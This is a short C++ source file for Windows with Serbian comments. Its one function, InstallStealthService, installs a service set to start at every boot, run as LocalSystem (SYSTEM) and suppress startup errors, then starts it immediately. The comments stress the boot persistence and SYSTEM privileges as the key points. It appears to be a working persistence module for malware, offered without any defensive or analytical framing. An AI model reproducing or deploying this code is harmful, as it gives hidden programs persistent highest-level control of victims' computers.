#include "service_manager.h"
#include <windows.h>

namespace ServiceManager {

    bool InstallStealthService(const char* serviceName, const char* displayName, const char* binaryPath) {
        // 1. Otvaranje Service Control Manager-a sa punim pristupom
        SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (scmHandle == NULL) {
            return false; // Nije uspelo, verovatno nemamo admin privilegije
        }

        // 2. Provera da li servis već postoji
        SC_HANDLE serviceHandle = OpenServiceA(scmHandle, serviceName, SERVICE_QUERY_CONFIG);
        if (serviceHandle != NULL) {
            // Servis već postoji, naš posao je završen
            CloseServiceHandle(serviceHandle);
            CloseServiceHandle(scmHandle);
            return true;
        }

        // 3. Servis ne postoji, kreiramo ga
        serviceHandle = CreateServiceA(
            scmHandle,
            serviceName,                 // Interno ime servisa
            displayName,                 // Prikazano ime
            SERVICE_ALL_ACCESS,          // Želimo pun pristup
            SERVICE_WIN32_OWN_PROCESS,   // Tip servisa
            SERVICE_AUTO_START,          // **KLJUČNO**: Pokreni automatski pri boot-u
            SERVICE_ERROR_IGNORE,        // Ne prikazuj greške ako ne uspe da se pokrene
            binaryPath,                  // Puna putanja do našeg .exe fajla
            NULL,                        // Nema load order group
            NULL,                        // Nema tag identifier
            NULL,                        // Nema zavisnosti
            "LocalSystem",               // **KLJUČNO**: Pokreni kao NT AUTHORITY\SYSTEM
            NULL                         // Nema lozinku
        );

        if (serviceHandle == NULL) {
            // Kreiranje nije uspelo
            CloseServiceHandle(scmHandle);
            return false;
        }

        // (Opciono) Pokreni servis odmah
        StartServiceA(serviceHandle, 0, NULL);

        // 4. Zatvaranje handle-ova
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);

        return true;
    }
}